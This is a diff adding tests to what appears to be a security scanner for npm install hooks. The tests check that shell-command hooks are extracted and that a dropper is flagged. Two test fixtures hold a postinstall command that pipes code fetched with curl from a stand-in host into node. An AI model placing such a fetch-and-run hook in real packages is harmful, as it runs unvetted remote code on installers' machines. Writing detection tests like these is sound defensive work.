@@ -127,3 +127,25 @@ class TestGrading:
         assert any(
             "package.json#postinstall-0.js" in (f.location.path or "") for f in result.findings
         )
+
+
+class TestTheCommandAsAShellProgram:
+    def test_a_command_doing_shell_work_is_lifted_whole(self):
+        command = "curl -s https://example.invalid/u.mjs | node --input-type=module"
+        program = InlinePrograms.shell("package/package.json", "postinstall", command)
+        assert program is not None
+        assert program.path == "package/package.json#postinstall.sh"
+        assert program.source == command
+
+    def test_a_command_that_only_names_a_tool_or_a_file_is_not(self):
+        for command in ("node-gyp rebuild", "node scripts/postinstall.js", "tsc -p ."):
+            assert InlinePrograms.shell("package.json", "install", command) is None
+
+    def test_fetched_code_piped_into_an_interpreter_is_a_dropper(self, tmp_path):
+        hook = {"postinstall": "curl -s https://example.invalid/u.mjs | node --input-type=module"}
+        result = HookKit.scan(HookKit.npm_package(tmp_path, hook))
+        # Reported on the hook's line in the manifest, which a reader can open.
+        assert any(
+            f.rule_id == "MALWARE.DROPPER.001" and f.location.path.endswith("package/package.json")
+            for f in result.findings
+        )
